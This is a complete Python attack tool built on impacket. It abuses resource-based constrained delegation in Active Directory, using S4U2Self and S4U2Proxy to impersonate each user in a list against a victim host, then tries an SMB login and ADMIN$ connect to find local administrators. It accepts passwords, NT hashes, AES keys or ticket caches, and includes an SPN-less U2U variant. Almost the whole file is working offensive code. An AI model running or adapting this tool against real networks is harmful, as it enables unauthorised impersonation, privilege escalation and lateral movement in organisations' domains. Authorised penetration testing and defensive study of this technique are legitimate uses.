#!/usr/bin/env python3
import argparse
import datetime
import os
import random
import socket
import struct
import sys
import threading
import time
import warnings
import concurrent.futures as cf
from binascii import unhexlify
from collections import Counter
from getpass import getpass

# impacket still calls datetime.utcnow() all over the place; we don't want a
# wall of DeprecationWarnings on top of the progress bar.
warnings.filterwarnings("ignore", category=DeprecationWarning)

try:
    from tqdm import tqdm
except ImportError:
    sys.exit("[!] tqdm required:  pip install tqdm")

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (AP_REQ, AS_REP, TGS_REQ, TGS_REP, Authenticator,
                                    PA_FOR_USER_ENC, PA_PAC_OPTIONS, EncTGSRepPart,
                                    Ticket as TicketAsn1, seq_set, seq_set_iter)
    from impacket.krb5.types import Principal, Ticket, KerberosTime
    from impacket.krb5.kerberosv5 import (getKerberosTGT, getKerberosTGS, sendReceive,
                                          KerberosError)
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import _HMACMD5, Key, _enctype_table
    from impacket.smbconnection import SMBConnection
except ImportError as e:
    sys.exit(f"[!] impacket required:  pip install impacket   ({e})")


def utcnow():
    """Timezone-aware UTC now. KerberosTime.to_asn1() only strftime()s it."""
    return datetime.datetime.now(datetime.timezone.utc)


# ---------------------------------------------------------------------------#
#  Output                                                                     #
# ---------------------------------------------------------------------------#
class C:
    """ANSI colours, neutered when stdout isn't a terminal or NO_COLOR is set."""
    RESET = BOLD = DIM = RED = GREEN = YELLOW = CYAN = ""

    @classmethod
    def enable(cls):
        cls.RESET, cls.BOLD, cls.DIM = "\033[0m", "\033[1m", "\033[2m"
        cls.RED, cls.GREEN, cls.YELLOW, cls.CYAN = (
            "\033[31m", "\033[32m", "\033[33m", "\033[36m")

    @classmethod
    def disable(cls):
        cls.RESET = cls.BOLD = cls.DIM = cls.RED = cls.GREEN = cls.YELLOW = cls.CYAN = ""


if sys.stdout.isatty() and not os.getenv("NO_COLOR"):
    C.enable()


def section(title):
    print(f"\n{C.CYAN}{C.BOLD}[*] {title}{C.RESET}")


def kv(key, value, colour=""):
    print(f"    {C.DIM}{key:<9}{C.RESET} {colour}{value}{C.RESET}")


def rule(title=""):
    width = 62
    if title:
        pad = "-" * max(0, (width - len(title) - 2) // 2)
        print(f"\n{C.DIM}{pad}{C.RESET} {C.BOLD}{title}{C.RESET} "
              f"{C.DIM}{pad}{C.RESET}")
    else:
        print(f"{C.DIM}{'-' * width}{C.RESET}")


def info(msg):
    print(f"{C.DIM}[i]{C.RESET} {msg}")


def die(msg):
    sys.exit(f"{C.RED}{C.BOLD}[!]{C.RESET}{C.RED} {msg}{C.RESET}")


# ---------------------------------------------------------------------------#
#  Shared, read-only context populated once at startup.                       #
# ---------------------------------------------------------------------------#
class Ctx:
    __slots__ = ("tgt", "cipher", "session_key", "domain", "machine_account",
                 "spn", "kdc", "target", "target_ip", "port", "timeout", "debug",
                 "u2u")


# ---------------------------------------------------------------------------#
#  S4U2Self + S4U2Proxy (RBCD). Faithful to impacket getST.py's doS4U.         #
#  Returns (encoded_TGS, cipher_for_that_TGS, session_key_of_that_TGS).        #
# ---------------------------------------------------------------------------#
def do_s4u(impersonate, ctx):
    domain = ctx.domain
    decodedTGT = decoder.decode(ctx.tgt, asn1Spec=AS_REP())[0]

    def _fresh_apreq_from_tgt():
        tkt = Ticket()
        tkt.from_asn1(decodedTGT["ticket"])
        ap = AP_REQ()
        ap["pvno"] = 5
        ap["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap["ap-options"] = constants.encodeFlags([])
        seq_set(ap, "ticket", tkt.to_asn1)
        auth = Authenticator()
        auth["authenticator-vno"] = 5
        auth["crealm"] = str(decodedTGT["crealm"])
        cname = Principal()
        cname.from_asn1(decodedTGT, "crealm", "cname")
        seq_set(auth, "cname", cname.components_to_asn1)
        now = utcnow()
        auth["cusec"] = now.microsecond
        auth["ctime"] = KerberosTime.to_asn1(now)
        enc = ctx.cipher.encrypt(ctx.session_key, 7, encoder.encode(auth), None)
        ap["authenticator"] = noValue
        ap["authenticator"]["etype"] = ctx.cipher.enctype
        ap["authenticator"]["cipher"] = enc
        return encoder.encode(ap)

    # ----------------------------- S4U2Self ------------------------------- #
    tgsReq = TGS_REQ()
    tgsReq["pvno"] = 5
    tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgsReq["padata"] = noValue
    tgsReq["padata"][0] = noValue
    tgsReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq["padata"][0]["padata-value"] = _fresh_apreq_from_tgt()

    # PA-FOR-USER checksum (KERB_CHECKSUM_HMAC_MD5, msg type 17)
    s4u_bytes = struct.pack("<I", constants.PrincipalNameType.NT_PRINCIPAL.value)
    s4u_bytes += impersonate.encode("utf-8") + domain.encode("utf-8") + b"Kerberos"
    checksum = _HMACMD5.checksum(ctx.session_key, 17, s4u_bytes)

    pfu = PA_FOR_USER_ENC()
    seq_set(pfu, "userName",
            Principal(impersonate,
                      type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
    pfu["userRealm"] = domain
    pfu["cksum"] = noValue
    pfu["cksum"]["cksumtype"] = int(constants.ChecksumTypes.hmac_md5.value)
    pfu["cksum"]["checksum"] = checksum
    pfu["auth-package"] = "Kerberos"

    tgsReq["padata"][1] = noValue
    tgsReq["padata"][1]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
    tgsReq["padata"][1]["padata-value"] = encoder.encode(pfu)

    body = seq_set(tgsReq, "req-body")
    self_opts = [
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.canonicalize.value,
    ]
    if ctx.u2u:
        # SPN-less controlled account: ask for the S4U2Self ticket encrypted in
        # our own TGT session key (enc-tkt-in-skey), with the TGT as additional
        # ticket. The operator must have set the account's NT hash to that same
        # session key beforehand, so the KDC can decrypt it again at S4U2Proxy.
        self_opts.append(constants.KDCOptions.renewable_ok.value)
        self_opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
    body["kdc-options"] = constants.encodeFlags(self_opts)
    seq_set(body, "sname",
            Principal(ctx.machine_account,
                      type=constants.PrincipalNameType.NT_UNKNOWN.value).components_to_asn1)
    body["realm"] = str(decodedTGT["crealm"])
    body["till"] = KerberosTime.to_asn1(utcnow() + datetime.timedelta(days=1))
    body["nonce"] = random.getrandbits(31)
    seq_set_iter(body, "etype",
                 (int(ctx.cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
    if ctx.u2u:
        tgt_ticket = Ticket()
        tgt_ticket.from_asn1(decodedTGT["ticket"])
        seq_set_iter(body, "additional-tickets", (tgt_ticket.to_asn1(TicketAsn1()),))

    try:
        r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
    except KerberosError as e:
        e.s4u_step = "S4U2Self"
        raise
    tgs_self = decoder.decode(r, asn1Spec=TGS_REP())[0]

    # ---------------------------- S4U2Proxy ------------------------------- #
    self_ticket = Ticket()
    self_ticket.from_asn1(tgs_self["ticket"])

    tgsReq = TGS_REQ()
    tgsReq["pvno"] = 5
    tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgsReq["padata"] = noValue
    tgsReq["padata"][0] = noValue
    tgsReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq["padata"][0]["padata-value"] = _fresh_apreq_from_tgt()

    # PA-PAC-OPTIONS with the resource-based-constrained-delegation bit: this is
    # what makes RBCD (rather than classic msDS-AllowedToDelegateTo) work.
    pac_opts = PA_PAC_OPTIONS()
    pac_opts["flags"] = constants.encodeFlags(
        (constants.PAPacOptions.resource_based_constrained_delegation.value,))
    tgsReq["padata"][1] = noValue
    tgsReq["padata"][1]["padata-type"] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
    tgsReq["padata"][1]["padata-value"] = encoder.encode(pac_opts)

    body = seq_set(tgsReq, "req-body")
    body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.cname_in_addl_tkt.value,   # S4U2Proxy
        constants.KDCOptions.canonicalize.value,
    ])
    seq_set(body, "sname",
            Principal(ctx.spn, type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
    body["realm"] = domain
    seq_set_iter(body, "additional-tickets", (self_ticket.to_asn1(TicketAsn1()),))
    body["till"] = KerberosTime.to_asn1(utcnow() + datetime.timedelta(days=1))
    body["nonce"] = random.getrandbits(31)
    seq_set_iter(body, "etype",
                 (int(constants.EncryptionTypes.rc4_hmac.value),
                  int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                  int(constants.EncryptionTypes.des_cbc_md5.value),
                  int(ctx.cipher.enctype)))

    try:
        r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
    except KerberosError as e:
        e.s4u_step = "S4U2Proxy"
        raise
    tgs_proxy = decoder.decode(r, asn1Spec=TGS_REP())[0]

    # The TGS-REP enc-part is sealed with the TGT session key (usage 8, no subkey).
    plain = ctx.cipher.decrypt(ctx.session_key, 8, tgs_proxy["enc-part"]["cipher"])
    enc_part = decoder.decode(plain, asn1Spec=EncTGSRepPart())[0]
    keytype = int(enc_part["key"]["keytype"])
    new_key = Key(keytype, bytes(enc_part["key"]["keyvalue"].asOctets()))
    new_cipher = _enctype_table[keytype]
    return r, new_cipher, new_key


# ---------------------------------------------------------------------------#
#  Per-user worker: S4U -> SMB kerberos login -> ADMIN$ tree connect.         #
# ---------------------------------------------------------------------------#
def process(user, ctx):
    try:
        tgs, cipher, sess = do_s4u(user, ctx)
    except KerberosError as e:
        return (user, *_classify(e, ctx))
    except Exception as e:                       # noqa: BLE001
        return user, "error", f"s4u: {_exc(e, ctx)}"

    smb = None
    try:
        smb = SMBConnection(ctx.target, ctx.target_ip, sess_port=ctx.port,
                            timeout=ctx.timeout)
        smb.kerberosLogin(user, "", ctx.domain, "", "", "", ctx.kdc,
                          TGS={"KDC_REP": tgs, "cipher": cipher, "sessionKey": sess},
                          useCache=False)
        try:
            tid = smb.connectTree("ADMIN$")
            smb.disconnectTree(tid)
            return user, "admin", ""
        except Exception:                        # ADMIN$ denied => not admin
            return user, "notadmin", ""
    except KerberosError as e:
        return (user, *_classify(e, ctx))
    except Exception as e:                        # noqa: BLE001
        return user, "error", f"smb: {_exc(e, ctx)}"
    finally:
        if smb is not None:
            try:
                smb.close()
            except Exception:
                pass


def _classify(e, ctx):
    """Split the expected Kerberos refusals from real errors.

    The impersonated user travels in PA-FOR-USER, i.e. in *client* position, so
    an account that doesn't exist comes back as C_PRINCIPAL_UNKNOWN. The S_
    variant is never about the user list: at S4U2Self it means the KDC doesn't
    know our own account, at S4U2Proxy that our SPN isn't registered anywhere.
    """
    step = getattr(e, "s4u_step", "")
    try:
        code = e.getErrorCode()
    except Exception:
        return "error", f"{step or 's4u'}: {e}"

    name = _kerr(e)
    if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
        return "nouser", name
    if code == constants.ErrorCodes.KDC_ERR_S_PRINCIPAL_UNKNOWN.value:
        if step == "S4U2Proxy":
            return "error", f"SPN unknown to the KDC: {ctx.spn}  (fix -target or -spn)"
        return "error", (f"the KDC does not know your own account "
                         f"{ctx.machine_account}  (fix the identity)")
    if code in (constants.ErrorCodes.KDC_ERR_BADOPTION.value,
                constants.ErrorCodes.KDC_ERR_POLICY.value,
                constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value):
        return "noticket", name
    return "error", f"{step or 's4u'}: {name}"


def _kerr(e):
    try:
        return e.getErrorString()[0]
    except Exception:
        return str(e)


def _exc(e, ctx):
    if ctx.debug:
        import traceback
        return traceback.format_exc().strip().replace("\n", " | ")
    return f"{type(e).__name__}: {e}"


# ---------------------------------------------------------------------------#
#  Credential handling (impacket-style).                                      #
# ---------------------------------------------------------------------------#
def parse_identity(identity):
    """domain/username[:password] -> (domain, username, password)"""
    domain = ""
    rest = identity
    if "/" in rest:
        domain, rest = rest.split("/", 1)
    username, password = rest, ""
    if ":" in rest:
        username, password = rest.split(":", 1)
    return domain, username, password


def parse_hashes(h):
    if not h:
        return b"", b""
    h = h.strip()
    lm, nt = h.split(":", 1) if ":" in h else ("", h)
    lm = lm.strip() or "aad3b435b51404eeaad3b435b51404ee"
    return unhexlify(lm), unhexlify(nt.strip())


def tgt_from_ccache(domain, username):
    """Pull a usable TGT out of KRB5CCNAME. Returns (tgt, cipher, key, user, domain)."""
    path = os.getenv("KRB5CCNAME")
    if not path:
        return None
    if not os.path.exists(path):
        die(f"KRB5CCNAME points to a missing file: {path}")
    ccache = CCache.loadFile(path)

    principal = ccache.principal.toPrincipal()
    cc_user = "/".join(str(c) for c in principal.components)
    cc_domain = str(principal.realm)
    domain = domain or cc_domain
    username = username or cc_user

    creds = ccache.getCredential(f"krbtgt/{domain.upper()}@{domain.upper()}")
    if creds is None:
        return None
    tgt = creds.toTGT()
    return tgt["KDC_REP"], tgt["cipher"], tgt["sessionKey"], username, domain.upper()


def acquire_tgt(args, domain, username, password, lmhash, nthash):
    """S4U is Kerberos-only, so a TGT is mandatory; -k only changes where it
    comes from. Returns (tgt, cipher, sessionKey, username, domain, method)."""
    if args.k:
        got = tgt_from_ccache(domain, username)
        if got is not None:
            return (*got, f"ccache ({os.getenv('KRB5CCNAME')})")
        if args.no_pass and not (password or nthash or args.aesKey):
            die("-k -no-pass but no usable TGT in KRB5CCNAME "
                f"(need krbtgt/{domain.upper()}@{domain.upper()}).")
        info(f"{C.YELLOW}no TGT in the ccache, falling back to the supplied "
             f"credentials.{C.RESET}")

    if not username:
        die("No username: give one in the identity, or use -k with a ccache.")

    if args.aesKey:
        method = "AES key -> AS-REQ"
    elif nthash:
        method = "NT hash -> AS-REQ"
    else:
        method = "password -> AS-REQ"

    tgt, cipher, _old, sess = getKerberosTGT(
        Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
        password, domain.upper(), lmhash, nthash, args.aesKey or "",
        args.dc_host or args.dc_ip)
    return tgt, cipher, sess, username, domain.upper(), method


# ---------------------------------------------------------------------------#
def load_lines(path):
    seen, out = set(), []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            v = line.strip()
            if v and not v.startswith("#") and v not in seen:
                seen.add(v)
                out.append(v)
    return out


def load_done(path):
    if not path or not os.path.exists(path):
        return set()
    done = set()
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            tok = line.strip().split("\t")
            if tok and tok[0]:
                done.add(tok[0])
    return done


def preflight(ctx):
    """One plain TGS-REQ for the SPN, with our own TGT.

    The KDC answers S_PRINCIPAL_UNKNOWN if the SPN isn't registered anywhere,
    which is the one mistake that would otherwise fail identically for every
    single user in the list. Cheap insurance: one round trip.
    """
    sname = Principal(ctx.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    try:
        getKerberosTGS(sname, ctx.domain, ctx.kdc, ctx.tgt, ctx.cipher, ctx.session_key)
    except KerberosError as e:
        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_S_PRINCIPAL_UNKNOWN.value:
            die(f"the KDC does not know {ctx.spn}.\n"
                f"    Check -target, or pass -spn if the host's DNS suffix differs "
                f"from the AD domain.")
        die(f"cannot request a ticket for {ctx.spn}: {_kerr(e)}")
    except Exception as e:                        # noqa: BLE001
        die(f"preflight against {ctx.kdc or ctx.domain} failed: {e}")


def resolve_target(target, domain, target_ip):
    """'VICTIM$' -> (fqdn, ip). Also accepts a bare name or an FQDN."""
    name = target.rstrip("$")
    if "." in name:
        fqdn = name
    else:
        fqdn = f"{name}.{domain.lower()}"
    if target_ip:
        return fqdn, target_ip
    try:
        return fqdn, socket.gethostbyname(fqdn)
    except socket.gaierror:
        die(f"Cannot resolve {fqdn}; pass -target-ip.")


def main():
    p = argparse.ArgumentParser(
        add_help=True,
        description="Parallel local-admin discovery on an RBCD-controlled host, "
                    "via S4U2Self+S4U2Proxy then an ADMIN$ tree connect.")
    p.add_argument("identity", help="domain.local/username[:password] of the account "
                                    "you control, e.g. red.local/ATTACKER$")
    p.add_argument("-target", required=True, metavar="ACCOUNT",
                   help="Machine account of the host to test, e.g. 'VICTIM$' "
                        "(RBCD must already be configured toward your account).")
    p.add_argument("-users", required=True, help="File: one AD user per line.")
    p.add_argument("-spn", default=None,
                   help="Override the SPN requested at S4U2Proxy (default cifs/<target "
                        "FQDN>). Needed when the host's DNS suffix differs from the AD "
                        "domain; keep the cifs/ class, SMB won't accept anything else.")
    p.add_argument("-o", "-outputfile", dest="output", default=None,
                   help="Append confirmed admins to this file. Off by default: "
                        "without it, results are only printed.")
    p.add_argument("-threads", type=int, default=20,
                   help="Concurrent workers (default 20). This hammers the DC; tune it.")
    p.add_argument("-port", type=int, default=445, help="SMB port (default 445).")
    p.add_argument("-timeout", type=int, default=10, help="SMB timeout seconds (default 10).")
    p.add_argument("-resume", action="store_true",
                   help="Skip users already listed in -o (requires -o).")
    p.add_argument("-errors-file", dest="errors_file", default="",
                   help="Log skipped/errored users here.")
    p.add_argument("-v", "-verbose", dest="verbose", action="count", default=0,
                   help="-v lists the no-ticket and unknown users as they come; "
                        "-vv also lists every user that simply isn't admin.")
    p.add_argument("-no-preflight", dest="no_preflight", action="store_true",
                   help="Skip the one-request SPN sanity check done before the scan.")
    p.add_argument("-debug", action="store_true", help="Full tracebacks on unexpected errors.")
    p.add_argument("-no-color", dest="no_color", action="store_true", help="Disable colours.")

    auth = p.add_argument_group(
        "authentication",
        "S4U2Self/S4U2Proxy is Kerberos-only, so a TGT for your account is always "
        "needed. By default it is requested from the KDC with the credentials below; "
        "-k reuses an existing one instead.")
    auth.add_argument("-hashes", metavar="LMHASH:NTHASH", default="", help="NTLM hashes.")
    auth.add_argument("-no-pass", dest="no_pass", action="store_true",
                      help="Don't ask for a password (useful with -k).")
    auth.add_argument("-k", action="store_true",
                      help="Take the TGT from the ccache file (KRB5CCNAME) instead of "
                           "requesting one. Falls back to the command-line credentials "
                           "if the ccache holds no usable TGT.")
    auth.add_argument("-aesKey", metavar="hex key", default="",
                      help="AES key to use for Kerberos authentication (128 or 256 bits).")
    auth.add_argument("-u2u", "-spnless", dest="u2u", action="store_true",
                      help="SPN-less controlled account: do S4U2Self as U2U "
                           "(enc-tkt-in-skey). Requires a ccache TGT (-k) whose session "
                           "key you already wrote as the account's NT hash. See the "
                           "SPN-less section of the README.")

    conn = p.add_argument_group("connection")
    conn.add_argument("-dc-ip", dest="dc_ip", default=None,
                      help="IP of the domain controller / KDC. Defaults to the domain part "
                           "of the identity.")
    conn.add_argument("-dc-host", dest="dc_host", default=None,
                      help="Hostname of the KDC. If omitted, -dc-ip is used.")
    conn.add_argument("-target-ip", dest="target_ip", default=None,
                      help="IP of -target. Defaults to resolving its FQDN.")
    args = p.parse_args()

    if args.no_color:
        C.disable()

    domain, username, password = parse_identity(args.identity)
    lmhash, nthash = parse_hashes(args.hashes)

    if not domain:
        die("identity must include the domain: domain.local/username[:password]")
    if args.resume and not args.output:
        die("-resume needs -o FILE: it skips the users already listed in it.")
    if not password and not nthash and not args.aesKey and not args.no_pass and not args.k:
        password = getpass("Password: ")

    section("Authentication")
    try:
        tgt, cipher, sess, username, domain, method = acquire_tgt(
            args, domain, username, password, lmhash, nthash)
    except SystemExit:
        raise
    except Exception as e:                        # noqa: BLE001
        die(f"Could not get a TGT: {e}")
    if args.u2u and not method.startswith("ccache"):
        die("-u2u needs the TGT from your ccache (-k -no-pass): the S4U2Self ticket "
            "is sealed with that TGT's session key, which you set as the account's NT "
            "hash. A freshly requested TGT would have a different key and fail.")
    kv("account", f"{username}@{domain}", C.BOLD)
    kv("method", method + ("  + U2U (SPN-less)" if args.u2u else ""))
    kv("KDC", args.dc_host or args.dc_ip or f"{domain.lower()} (DNS)")
    kv("TGT", "OK", C.GREEN)

    fqdn, target_ip = resolve_target(args.target, domain, args.target_ip)

    ctx = Ctx()
    ctx.tgt, ctx.cipher, ctx.session_key = tgt, cipher, sess
    ctx.domain = domain
    ctx.machine_account = username
    ctx.spn = args.spn or f"cifs/{fqdn}"
    ctx.kdc = args.dc_host or args.dc_ip
    ctx.target = fqdn
    ctx.target_ip = target_ip
    ctx.port = args.port
    ctx.timeout = args.timeout
    ctx.debug = args.debug
    ctx.u2u = args.u2u

    section("Target")
    kv("host", f"{fqdn} ({target_ip}:{args.port})", C.BOLD)
    kv("SPN", ctx.spn)
    kv("check", "S4U2Self + S4U2Proxy, then ADMIN$ tree connect")
    if not args.no_preflight:
        preflight(ctx)
        kv("SPN check", "OK", C.GREEN)

    users = load_lines(args.users)
    skipped = 0
    if args.resume:
        done = load_done(args.output)
        before = len(users)
        users = [u for u in users if u not in done]
        skipped = before - len(users)

    section("Run")
    kv("users", f"{len(users)}" + (f"  {C.DIM}({skipped} skipped, -resume){C.RESET}"
                                   if skipped else ""))
    kv("threads", args.threads)
    kv("timeout", f"{args.timeout}s  {C.DIM}(SMB){C.RESET}")
    kv("output", args.output or "stdout only (-o FILE to save)")
    print()

    if not users:
        info("Nothing to do.")
        return

    admins, errors, noticket, nouser = [], [], [], []
    processed = 0
    file_lock = threading.Lock()
    out_fh = open(args.output, "a", encoding="utf-8") if args.output else None

    executor = cf.ThreadPoolExecutor(max_workers=args.threads)
    futures = {executor.submit(process, u, ctx): u for u in users}
    started = time.monotonic()
    # leave=False: the bar is erased when it closes, so the summary is what
    # stays on screen at the end.
    bar = tqdm(total=len(futures), unit="usr", dynamic_ncols=True, desc="checking",
               leave=False)
    try:
        for fut in cf.as_completed(futures):
            user, status, detail = fut.result()
            if status == "admin":
                admins.append(user)
                if out_fh is not None:
                    with file_lock:
                        out_fh.write(f"{user}\n")
                        out_fh.flush()
                tqdm.write(f"{C.GREEN}{C.BOLD}[+] ADMIN    {user}{C.RESET}")
            elif status == "error":
                errors.append((user, detail))
                tqdm.write(f"{C.RED}[!] error    {user}{C.RESET}  {C.DIM}{detail}{C.RESET}")
            elif status == "noticket":
                noticket.append((user, detail))
                if args.verbose >= 1:
                    tqdm.write(f"{C.YELLOW}[-] noticket {user}{C.RESET}  "
                               f"{C.DIM}{detail}{C.RESET}")
            elif status == "nouser":
                nouser.append((user, detail))
                if args.verbose >= 1:
                    tqdm.write(f"{C.DIM}[-] unknown  {user}{C.RESET}")
            elif args.verbose >= 2:
                tqdm.write(f"{C.DIM}[-] no       {user}{C.RESET}")
            processed += 1
            bar.set_postfix(adm=len(admins), notk=len(noticket),
                            nousr=len(nouser), err=len(errors))
            bar.update(1)
    except KeyboardInterrupt:
        tqdm.write(f"\n{C.RED}[!] Interrupted; cancelling pending work.{C.RESET}")
        executor.shutdown(cancel_futures=True)
    finally:
        bar.close()
        if out_fh is not None:
            out_fh.close()
        executor.shutdown(wait=False)

    if args.errors_file and (errors or noticket or nouser):
        with open(args.errors_file, "w", encoding="utf-8") as ef:
            for tag, rows in (("error", errors), ("noticket", noticket), ("nouser", nouser)):
                for u, d in rows:
                    ef.write(f"{tag}\t{u}\t{d}\n")

    rule("Summary")

    def tally(label, n, colour, note):
        colour = colour if n else C.DIM
        print(f"  {colour}{C.BOLD}{n:>6}{C.RESET}  {colour}{label:<10}{C.RESET}"
              f"{C.DIM}{note}{C.RESET}")

    tally("admins", len(admins), C.GREEN, "local administrators of the target")
    tally("no ticket", len(noticket), C.YELLOW,
          "not delegatable, disabled, locked out or expired")
    tally("unknown", len(nouser), C.DIM, "no such principal in the realm")
    tally("errors", len(errors), C.RED, "unexpected failures")
    elapsed = time.monotonic() - started
    rate = processed / elapsed if elapsed else 0
    print(f"  {C.CYAN}{C.BOLD}{processed:>6}  checked   "
          f"out of {len(users)} in {elapsed:.1f}s{C.RESET}"
          f"  {C.CYAN}({rate:.0f} users/s){C.RESET}")

    for label, rows, colour in (("no ticket", noticket, C.YELLOW),
                                ("errors", errors, C.RED)):
        if rows:
            print(f"\n  {C.DIM}{label} breakdown:{C.RESET}")
            for reason, n in Counter(d for _, d in rows).most_common(5):
                print(f"    {colour}{n:>5}x{C.RESET}  {reason}")

    if (noticket or nouser) and not args.verbose and not args.errors_file:
        print(f"\n  {C.DIM}(-v lists them live, -errors-file FILE writes them out){C.RESET}")

    if admins:
        where = (f"{C.DIM}(also written to {args.output}){C.RESET}" if args.output
                 else f"{C.DIM}(-o FILE to save them){C.RESET}")
        print(f"\n  {C.GREEN}{C.BOLD}Local admins{C.RESET} {where}")
        for user in admins[:25]:
            print(f"    {C.GREEN}+{C.RESET} {user}")
        if len(admins) > 25:
            print(f"    {C.DIM}... and {len(admins) - 25} more{C.RESET}")
    print()


if __name__ == "__main__":
    main()
